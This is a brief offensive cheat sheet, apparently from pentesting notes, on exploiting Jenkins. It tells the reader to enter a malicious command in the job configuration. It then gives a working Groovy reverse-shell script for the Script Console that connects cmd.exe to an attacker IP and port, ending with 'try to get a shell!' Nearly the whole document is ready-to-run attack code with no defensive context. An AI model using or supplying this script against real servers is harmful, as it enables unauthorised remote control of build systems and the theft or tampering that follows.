# Jenkins

### Execute Commands

Navigate to `Jenkins > Access > Configure > Command `and type a malicious command.

### Script Console

Navigate to `Manage Jenkins>>Script Console` and edit this code for a reverse connection:

```
String host="10.10.0.67";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new 
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), 
si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try 
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Click run and try to get a shell!
